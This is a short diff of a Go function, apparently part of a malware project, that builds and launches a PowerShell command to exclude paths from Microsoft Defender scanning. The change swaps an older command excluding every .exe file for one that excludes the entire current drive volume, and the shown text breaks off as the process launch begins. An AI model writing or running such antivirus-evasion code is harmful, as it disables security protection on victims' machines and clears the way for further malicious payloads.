@@ -1,12 +1,27 @@
 package Exclude
 
 import (
+	"fmt"
+	"os"
+	"path/filepath"
 	"syscall"
 	"unsafe"
 )
 
 func FileExtensions() {
-	wdsmd := `powershell -Command "Set-MpPreference -ExclusionExtension *.exe -Force"`
+	dir, err := os.Getwd()
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+
+	vol := filepath.VolumeName(dir)
+
+	// Legacy code
+	//wdsmd := `powershell -Command "Set-MpPreference -ExclusionExtension *.exe -Force"`
+	//line, _ := syscall.UTF16PtrFromString(wdsmd)
+
+	wdsmd := fmt.Sprintf(`powershell -C "Add-MpPreference -ExclusionPath '%v'"`, vol)
 	line, _ := syscall.UTF16PtrFromString(wdsmd)
 
 	var si syscall.StartupInfo
